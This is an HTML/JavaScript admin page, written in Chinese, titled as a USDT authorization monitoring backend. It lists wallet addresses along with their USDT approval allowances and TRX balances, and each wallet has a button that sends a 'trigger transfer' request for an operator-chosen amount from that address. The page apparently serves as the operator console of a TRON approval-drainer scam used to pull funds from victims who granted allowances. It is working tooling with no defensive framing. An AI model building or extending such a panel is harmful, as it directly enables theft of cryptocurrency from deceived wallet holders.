<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>USDT 授權監控後台</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      padding: 2em;
      background: #f2f2f2;
      text-align: center;
    }
    button {
      background: #0984e3;
      color: #fff;
      border: none;
      padding: 1em 2em;
      border-radius: 8px;
      font-size: 1.2em;
      cursor: pointer;
    }
    table {
      margin-top: 20px;
      width: 80%;
      margin-left: auto;
      margin-right: auto;
      border-collapse: collapse;
    }
    th, td {
      padding: 8px;
      text-align: left;
      border: 1px solid #ddd;
    }
  </style>
</head>
<body>
  <h1>USDT 授權監控後台</h1>

  <button onclick="fetchWallets()">刷新錢包列表</button>
  <table id="walletsTable">
    <thead>
      <tr>
        <th>錢包地址</th>
        <th>USDT 授權額度</th>
        <th>TRX 餘額</th>
        <th>發動轉帳</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

  <script>
    const API_URL = "http://localhost:3333";  // 後端 API 地址

    // 刷新錢包列表
    async function fetchWallets() {
      try {
        const response = await axios.get(`${API_URL}/wallets`);
        const wallets = response.data;
        const tableBody = document.querySelector("#walletsTable tbody");
        tableBody.innerHTML = '';  // 清空目前的錢包列表

        wallets.forEach(wallet => {
          const row = document.createElement("tr");
          const walletCell = document.createElement("td");
          const allowanceCell = document.createElement("td");
          const trxBalanceCell = document.createElement("td");
          const actionsCell = document.createElement("td");

          walletCell.textContent = wallet.address;
          allowanceCell.textContent = "待查詢";  // 授權額度
          trxBalanceCell.textContent = "待查詢";  // TRX 餘額
          actionsCell.innerHTML = `<button onclick="triggerTransfer('${wallet.address}')">觸發轉帳</button>`;

          row.appendChild(walletCell);
          row.appendChild(allowanceCell);
          row.appendChild(trxBalanceCell);
          row.appendChild(actionsCell);

          tableBody.appendChild(row);
        });
      } catch (error) {
        console.error("Error fetching wallets:", error);
      }
    }

    // 觸發轉帳
    async function triggerTransfer(address) {
      const amount = prompt("請輸入轉帳金額：");
      if (!amount || isNaN(amount) || amount <= 0) return alert("請輸入有效金額");

      try {
        const response = await axios.post(`${API_URL}/trigger-transfer`, {
          userAddress: address,
          amount: amount
        });
        alert("✅ 轉帳成功！");
      } catch (error) {
        alert("❌ 轉帳失敗，請重試！");
      }
    }

    // 頁面加載時顯示錢包資料
    window.onload = fetchWallets;
  </script>

</body>
</html>
